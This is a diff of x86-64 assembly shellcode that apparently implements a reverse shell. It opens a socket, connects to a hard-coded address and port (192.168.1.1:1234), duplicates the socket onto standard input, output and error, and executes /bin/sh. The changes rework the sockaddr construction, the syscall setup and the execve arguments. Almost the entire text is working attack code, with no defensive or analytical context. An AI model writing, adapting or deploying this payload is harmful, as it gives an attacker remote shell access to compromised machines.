@@ -21,6 +21,7 @@ inc rsi
 xor rax, rax ; rax = 0
 mov al, 0x29 ; initialize to 41
 syscall	; execute socket and value of sockfd is stored in rax
+mov rdi, rax
 
 ;mysockaddr.sin_family = AF_INET;
 ;mysockaddr.sin_port = htons(port);
@@ -31,20 +32,15 @@ syscall	; execute socket and value of sockfd is stored in rax
 ; Push from bottom up since it is in a stack and a pointer reference
 ; htons of port 1234 is python -c "hex(socket.htons(1234))" which is 0xd204
 
-xor rcx, rcx
-mov rcx, 0x24ae16ac ; 
-push rcx ; Store value of ip address on stack
-xor rbx, rbx;
-mov bx, 0xd204 ; 
-push rbx 
-push rdi ; since rdi already stores the value of IF_INET which is 2
+push dword 0x0101a8c0  
+push word 0xd204 
+push word  0x2 ; since rdi already stores the value of IF_INET which is 2
 
 ;connect syscall is 42
 
 xor rdx, rdx
 mov dl, 0x10; sizeof sockaddr is 16
 mov rsi, rsp ; Put the structure pointer into second argument
-mov rdi, rax
 xor rax, rax
 add rax, 42
 syscall ;	 Call connect function syscallconnect(sockfd, (struct sockaddr *) &mysockaddr, sizeof(mysockaddr));
@@ -55,14 +51,17 @@ syscall ;	 Call connect function syscallconnect(sockfd, (struct sockaddr *) &mys
 
 ;sockfd is still stored in rdi so there is no neeed to change rdi
 xor rsi, rsi
-mov al, 0x21
+xor rax, rax
+add rax, 0x21
 syscall ; dup2(sockfd,0)
 
-mov al, 0x21
+xor rax, rax
+add rax, 0x21
 inc rsi
 syscall ; dup2(sockfd,1)
 
-mov al, 0x21
+xor rax, rax
+add rax, 0x21
 inc rsi
 syscall ; dup2(sockfd,2)
 
@@ -73,20 +72,27 @@ syscall ; dup2(sockfd,2)
 ;stringg[::-1].encode("hex")
 ;which gives '68732f6e69622f2f'
 
-mov rax, 0x68732f6e69622f2f
-push rax ; onto stack
-mov rdi, rsp ; move "/bin/sh" as first argument
-xor rbx,rbx
-push rbx ; NULL
-push rdi ; /bin/sh onto stack as the argv
-xor rdx,rdx; NULL
 xor rax, rax
-add rax, 0x59 ; insert syscall number eecve
-syscall; execute syscall
+xor rdi, rdi ; third argument
+xor rsi, rsi
+xor rdx, rdx
+
+push rax ; push 0 on stack
+mov rdx, rsp
+;0x68732f6e69622f2f
+mov rbx, 0x68732f6e69622f2f
+push rbx
+mov rdi, rsp
+push rax
+push rdi
+mov rsi, rsp
+add rax, 59
+syscall
+
 
 xor rax,rax
 mov al, 0x3c
-mov dl , 0x0
+xor rdi, rdi
 syscall ; EXIT FROM PROGRAM
 
 
